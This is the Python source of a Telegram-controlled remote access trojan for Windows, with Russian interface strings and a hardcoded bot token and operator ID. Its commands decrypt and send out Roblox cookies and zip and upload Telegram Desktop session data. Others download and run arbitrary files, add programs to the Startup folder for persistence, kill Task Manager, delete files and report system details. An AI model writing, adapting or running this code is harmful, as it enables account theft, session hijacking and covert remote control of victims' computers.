import base64
import glob
import io
import json
import shutil
import sqlite3
from io import BytesIO
import platform
from zipfile import ZipFile, ZIP_DEFLATED

import pyautogui
import wmi
import socket
import psutil
import win32crypt
from Cryptodome.Cipher import AES
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
import subprocess
import requests
import os

TOKEN_URL = "https://raw.githubusercontent.com/wasrecordrecorder/Crosshair/refs/heads/main/dwadawdwadsadwad.txt"

def get_token():
    response = requests.get(TOKEN_URL)
    response.raise_for_status()
    return response.text.strip()

# BOT_TOKEN = get_token()
BOT_TOKEN = "8145162196:AAE7pdVH2Ib_S3IW71xbGp-PlHrxnwQx3BY"
ALLOWED_USER_ID = 1417914108


async def check_access(update: Update):
    if update.effective_user.id != ALLOWED_USER_ID:
        await update.message.reply_text("⛔ Доступ запрещён!")
        return False
    return True

current_directory = os.path.expanduser("~")  

async def mkdir(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_access(update):
        return

    if not context.args:
        await update.message.reply_text("Использование: /mkdir <имя_папки>")
        return

    dir_name = ' '.join(context.args)
    try:
        path = os.path.join(current_directory, dir_name)
        os.makedirs(path, exist_ok=True)
        await update.message.reply_text(f"Папка создана: {path}")
    except Exception as e:
        await update.message.reply_text(f"Ошибка: {str(e)}")

async def cd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global current_directory
    
    if not await check_access(update):
        return

    if not context.args:
        current_directory = os.path.expanduser("~")
        await update.message.reply_text(f"Текущая директория: {current_directory}")
        return

    target_dir = ' '.join(context.args)
    try:
        if os.path.isabs(target_dir):
            new_dir = target_dir
        else:
            new_dir = os.path.join(current_directory, target_dir)
        
        if os.path.isdir(new_dir):
            current_directory = os.path.normpath(new_dir)
            await update.message.reply_text(f"Текущая директория: {current_directory}")
        else:
            await update.message.reply_text("Директория не существует")
    except Exception as e:
        await update.message.reply_text(f"Ошибка: {str(e)}")

async def ls(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_access(update):
        return

    try:
        files = []
        dirs = []
        
        for item in os.listdir(current_directory):
            if os.path.isdir(os.path.join(current_directory, item)):
                dirs.append(f"[DIR] {item}")
            else:
                files.append(item)
        
        response = f"Содержимое {current_directory}:\n"
        response += "\n".join(sorted(dirs) + sorted(files))
        
        if not (dirs or files):
            response = "Директория пуста"
            
        await update.message.reply_text(response)
    except Exception as e:
        await update.message.reply_text(f"Ошибка: {str(e)}")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_access(update):
        return

    await update.message.reply_text(
        "Бот запущен. Доступные команды:\n"
        "/autostart - управление автозагрузкой через реестр\n"
        "/click - сделать клик мышью\n"
        "/mkdir <имя> - создать папку\n"
        "/cd <путь> - сменить директорию\n"
        "/cd - вернуться в домашнюю директорию\n"
        "/ls - показать содержимое директории\n"
        "/kill_roblox - закрыть Roblox\n"
        "/kill_browser - закрыть браузер\n"
        "/kill_taskmgr - закрыть диспетчер задач\n"
        "/killtask <имя>.exe - закрыть процесс по имени\n"
        "/pcinfo - информация о системе\n"
        "/gettelegram - получить данные Telegram\n"
        "/download <URL> <путь> - скачать файл\n"
        "/run <путь> - запустить файл\n"
        "/steal - получить куки Roblox\n"
        "/delfile <путь> - удалить файл"
    )

async def kill_roblox(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_access(update):
        return

    subprocess.run(["taskkill", "/F", "/IM", "RobloxPlayerBeta.exe"], shell=True)
    await update.message.reply_text("Roblox закрыт.")


async def kill_browser(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_access(update):
        return

    subprocess.run(["taskkill", "/F", "/IM", "browser.exe"], shell=True)
    await update.message.reply_text("Браузер закрыт.")


async def kill_taskmgr(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_access(update):
        return

    subprocess.run(["taskkill", "/F", "/IM", "taskmgr.exe"], shell=True)
    await update.message.reply_text("Диспетчер задач закрыт.")


async def kill_task(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_access(update):
        return

    if not context.args:
        await update.message.reply_text("Использование: /killtask <имя процесса>.exe")
        return

    process_name = context.args[0]

    try:
        subprocess.run(["taskkill", "/F", "/IM", process_name], shell=True)
        await update.message.reply_text(f"Процесс {process_name} успешно завершён.")
    except Exception as e:
        await update.message.reply_text(f"Ошибка при завершении процесса: {str(e)}")


async def mouse_click(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_access(update):
        return
    try:
        args = context.args
        x, y = pyautogui.position()

        if not args:
            pyautogui.click()
            action = "Одинарный клик"
        elif args[0] == "double":
            pyautogui.doubleClick()
            action = "Двойной клик"
        elif args[0] == "right":
            pyautogui.rightClick()
            action = "Правый клик"
        elif len(args) == 2:
            x, y = int(args[0]), int(args[1])
            pyautogui.click(x, y)
            action = f"Клик по координатам {x},{y}"
        else:
            await update.message.reply_text(
                "Использование:\n"
                "/click - обычный клик\n"
                "/click double - двойной клик\n"
                "/click right - правый клик\n"
                "/click X Y - клик по координатам"
            )
            return

        await update.message.reply_text(f"✅ {action} выполнен на координатах: X={x}, Y={y}")

    except Exception as e:
        await update.message.reply_text(f"❌ Ошибка: {str(e)}")

async def pcinfo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_access(update):
        return
    try:
        username = os.getenv("USERNAME")
    except Exception as e:
        username = f"не найдено: {str(e)}"
    try:
        hostname = socket.gethostname()
    except Exception as e:
        hostname = f"не найдено: {str(e)}"
    try:
        ip_address = socket.gethostbyname(socket.gethostname())
    except Exception as e:
        ip_address = f"не найден: {str(e)}"
    try:
        cpu_info = platform.processor()
    except Exception as e:
        cpu_info = f"не найден: {str(e)}"
    try:
        cpu_cores = psutil.cpu_count(logical=False)
    except Exception as e:
        cpu_cores = f"не найден: {str(e)}"
    try:
        cpu_threads = psutil.cpu_count(logical=True)
    except Exception as e:
        cpu_threads = f"не найден: {str(e)}"
    try:
        cpu_usage = psutil.cpu_percent(interval=1)
    except Exception as e:
        cpu_usage = f"не найден: {str(e)}"
    try:
        mem = psutil.virtual_memory()
        total_mem = round(mem.total / (1024**3), 2)
        used_mem = round(mem.used / (1024**3), 2)
    except Exception as e:
        total_mem = f"не найден: {str(e)}"
        used_mem = f"не найден: {str(e)}"
    try:
        c = wmi.WMI()
        gpu = c.Win32_VideoController()[0]
        gpu_info = f"{gpu.Name} (Драйвер: {gpu.DriverVersion})"
    except Exception as e:
        gpu_info = f"не найдено: {str(e)}"
    monitor_info = []
    try:
        for monitor in c.Win32_DesktopMonitor():
            monitor_info.append(f"{monitor.ScreenWidth}x{monitor.ScreenHeight} {monitor.PNPDeviceID}")
    except Exception as e:
        monitor_info.append(f"не найдено: {str(e)}")
    try:
        board = c.Win32_Baseboard()[0]
        motherboard = f"{board.Manufacturer} {board.Product}"
    except Exception as e:
        motherboard = f"не найдено: {str(e)}"
    disks_info = []
    try:
        for disk in psutil.disk_partitions():
            if disk.fstype:
                try:
                    usage = psutil.disk_usage(disk.mountpoint)
                    disks_info.append(
                        f"{disk.device} ({disk.fstype}) - Всего: {round(usage.total / (1024**3), 2)} GB, Свободно: {round(usage.free / (1024**3), 2)} GB"
                    )
                except Exception as e:
                    disks_info.append(
                        f"{disk.device} - Ошибка: {str(e)}"
                    )
    except Exception as e:
        disks_info.append(f"не найдено: {str(e)}")
    message = (
        "🖥️ *Информация о системе*\n\n"
        f"*Имя пользователя:* {username}\n"
        f"*Имя компьютера:* {hostname}\n"
        f"*IP-адрес:* {ip_address}\n\n"
        "*Процессор:*\n"
        f"- Модель: {cpu_info}\n"
        f"- Ядра: {cpu_cores}\n"
        f"- Потоки: {cpu_threads}\n"
        f"- Загрузка: {cpu_usage}%\n\n"
        "*Оперативная память:*\n"
        f"- Всего: {total_mem} GB\n"
        f"- Используется: {used_mem} GB\n\n"
        "*Видеокарта:*\n"
        f"- {gpu_info}\n\n"
        "*Монитор(ы):*\n" + "\n".join(f"- {mon}" for mon in monitor_info) + "\n\n"
        "*Материнская плата:*\n"
        f"- {motherboard}\n\n"
        "*Диски:*\n" + "\n".join(f"- {disk}" for disk in disks_info) + "\n\n"
        "*ОС:*\n"
        f"- {platform.system()} {platform.version()}\n"
        f"- Архитектура: {platform.machine()}"
    )
    await update.message.reply_text(message, parse_mode='Markdown')


async def get_telegram_archive_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_access(update):
        return
    try:
        await update.message.reply_text("🔄 Начинаю сбор данных Telegram...")
        archive = io.BytesIO()
        files_count = 0
        skipped_files = 0
        with ZipFile(archive, 'w') as zipf:
            search_paths = [
                os.path.join(os.getenv('APPDATA'), 'Telegram Desktop', 'tdata'),
                os.path.join(os.getenv('LOCALAPPDATA'), 'Telegram Desktop', 'tdata'),
                os.path.join(os.getenv('LOCALAPPDATA'), 'Packages', 'TelegramMessengerLLP.TelegramDesktop*',
                             'LocalCache', 'Roaming', 'Telegram Desktop UWP', 'tdata')
            ]
            for base_path in search_paths:
                if '*' in base_path:
                    import glob
                    expanded_paths = glob.glob(base_path)
                    if not expanded_paths:
                        continue
                    base_path = expanded_paths[0]
                tdata_path = os.path.join(base_path)
                if not os.path.exists(tdata_path):
                    continue
                for root, _, files in os.walk(tdata_path):
                    for file in files:
                        file_path = os.path.join(root, file)
                        try:
                            arcname = os.path.relpath(file_path, tdata_path)
                            zipf.write(file_path, arcname)
                            files_count += 1
                        except Exception as e:
                            skipped_files += 1
                            continue
        if files_count == 0:
            raise Exception("Не удалось добавить ни одного файла в архив")
        archive.seek(0)
        await update.message.reply_text(
            f"📦 Успешно добавлено файлов: {files_count}\n"
            f"🚫 Пропущено файлов: {skipped_files}\n"
            "⬆️ Отправляю архив..."
        )
        await update.message.reply_document(
            document=archive,
            filename='telegram_data.zip',
            caption=f"Данные Telegram ({files_count} файлов)"
        )
    except Exception as e:
        await update.message.reply_text(f"❌ Ошибка: {str(e)}")

async def getInfoKeys():
    user_profile = os.getenv("USERPROFILE", "")
    roblox_cookies_path = os.path.join(
        user_profile,
        "AppData",
        "Local",
        "Roblox",
        "LocalStorage",
        "robloxcookies.dat"
    )

    cookies_data = []
    try:
        if os.path.exists(roblox_cookies_path):
            temp_dir = os.getenv("TEMP", "")
            destination_path = os.path.join(temp_dir, "RobloxCookies.dat")
            shutil.copy(roblox_cookies_path, destination_path)
            with open(destination_path, 'r', encoding='utf-8') as file:
                file_content = json.load(file)
                encoded_cookies = file_content.get("CookiesData", "")
                if encoded_cookies:
                    decoded_cookies = base64.b64decode(encoded_cookies)
                    decrypted_cookies = win32crypt.CryptUnprotectData(
                        decoded_cookies,
                        None,
                        None,
                        None,
                        0
                    )[1]
                    cookies_data = decrypted_cookies.decode('utf-8', errors='ignore')
            os.remove(destination_path)
        return cookies_data
    except Exception as e:
        print(f"")
        return []


async def recieveData(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_access(update):
        return

    await update.message.reply_text("Получаю куки Roblox...")

    try:
        data = {
            "roblox_cookies": await getInfoKeys()
        }

        files = {
            'roblox_cookies.json': BytesIO(json.dumps(data["roblox_cookies"], indent=4).encode())
        }

        await update.message.reply_document(
            document=files['roblox_cookies.json'],
            filename='roblox_cookies.json'
        )
    except Exception as e:
        await update.message.reply_text(f"Ошибка при получении куки: {str(e)}")


async def download(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_access(update):
        return

    if len(context.args) < 2:
        await update.message.reply_text("Использование: /download <URL> <путь для сохранения>")
        return

    url = context.args[0]
    path = context.args[1]

    try:
        response = requests.get(url, stream=True)
        response.raise_for_status()

        os.makedirs(os.path.dirname(path), exist_ok=True)

        with open(path, 'wb') as file:
            for chunk in response.iter_content(chunk_size=8192):
                file.write(chunk)

        await update.message.reply_text(f"Файл успешно скачан и сохранён по пути: {path}")
    except Exception as e:
        await update.message.reply_text(f"Ошибка при скачивании файла: {str(e)}")


async def run_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_access(update):
        return

    if not context.args:
        await update.message.reply_text("Использование: /run <путь к файлу>")
        return

    path = ' '.join(context.args)

    try:
        if os.path.exists(path):
            if os.name == 'nt':
                os.startfile(path)
            else:
                subprocess.run(['xdg-open', path])
            await update.message.reply_text(f"Файл {path} успешно запущен")
        else:
            await update.message.reply_text(f"Файл не найден по пути: {path}")
    except Exception as e:
        await update.message.reply_text(f"Ошибка при запуске файла: {str(e)}")


async def delete_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_access(update):
        return

    if not context.args:
        await update.message.reply_text("Использование: /delfile <путь к файлу>")
        return

    path = ' '.join(context.args)

    try:
        if os.path.exists(path):
            if os.path.isfile(path):
                os.remove(path)
                await update.message.reply_text(f"Файл {path} успешно удалён")
            else:
                await update.message.reply_text(f"Указанный путь не является файлом: {path}")
        else:
            await update.message.reply_text(f"Файл не найден по пути: {path}")
    except Exception as e:
        await update.message.reply_text(f"Ошибка при удалении файла: {str(e)}")


async def autostart(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_access(update):
        return

    if not context.args:
        try:
            startup_path = os.path.join(
                os.getenv('APPDATA'),
                'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'
            )

            files = []
            if os.path.exists(startup_path):
                for item in os.listdir(startup_path):
                    files.append(item)

            if files:
                await update.message.reply_text(
                    "Файлы в автозагрузке:\n" + "\n".join(files)
                )
            else:
                await update.message.reply_text("В автозагрузке нет файлов")
        except Exception as e:
            await update.message.reply_text(f"Ошибка: {str(e)}")
        return

    action = context.args[0].lower()

    if action not in ('add', 'remove'):
        await update.message.reply_text(
            "Использование:\n"
            "/autostart - показать файлы\n"
            "/autostart add <путь> - добавить в автозагрузку\n"
            "/autostart remove <имя файла> - удалить из автозагрузки"
        )
        return

    try:
        startup_path = os.path.join(
            os.getenv('APPDATA'),
            'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'
        )
        if not os.path.exists(startup_path):
            os.makedirs(startup_path)
        if action == 'add':
            if len(context.args) < 2:
                await update.message.reply_text("Укажите путь к файлу")
                return
            source_path = ' '.join(context.args[1:])
            if not os.path.exists(source_path):
                await update.message.reply_text("Файл не найден")
                return
            dest_path = os.path.join(
                startup_path,
                os.path.basename(source_path)
            )
            shutil.copy2(source_path, dest_path)
            await update.message.reply_text(f"Файл добавлен в автозагрузку: {dest_path}")
        elif action == 'remove':
            if len(context.args) < 2:
                await update.message.reply_text("Укажите имя файла")
                return
            file_name = ' '.join(context.args[1:])
            target_path = os.path.join(startup_path, file_name)
            if os.path.exists(target_path):
                os.remove(target_path)
                await update.message.reply_text(f"Файл удален из автозагрузки: {file_name}")
            else:
                await update.message.reply_text("Файл не найден в автозагрузке")
    except Exception as e:
        await update.message.reply_text(f"Ошибка: {str(e)}")

app = ApplicationBuilder().token(BOT_TOKEN).build()

app.add_handler(CommandHandler("start", start))
app.add_handler(CommandHandler("kill_roblox", kill_roblox))
app.add_handler(CommandHandler("kill_browser", kill_browser))
app.add_handler(CommandHandler("kill_taskmgr", kill_taskmgr))
app.add_handler(CommandHandler("download", download))
app.add_handler(CommandHandler("steal", recieveData))
app.add_handler(CommandHandler("run", run_file))
app.add_handler(CommandHandler("delfile", delete_file))
app.add_handler(CommandHandler("killtask", kill_task))
app.add_handler(CommandHandler("pcinfo", pcinfo))
app.add_handler(CommandHandler("gettelegram", get_telegram_archive_command))
app.add_handler(CommandHandler("mkdir", mkdir))
app.add_handler(CommandHandler("cd", cd))
app.add_handler(CommandHandler("ls", ls))
app.add_handler(CommandHandler("click", mouse_click))
app.add_handler(CommandHandler("autostart", autostart))

app.run_polling()
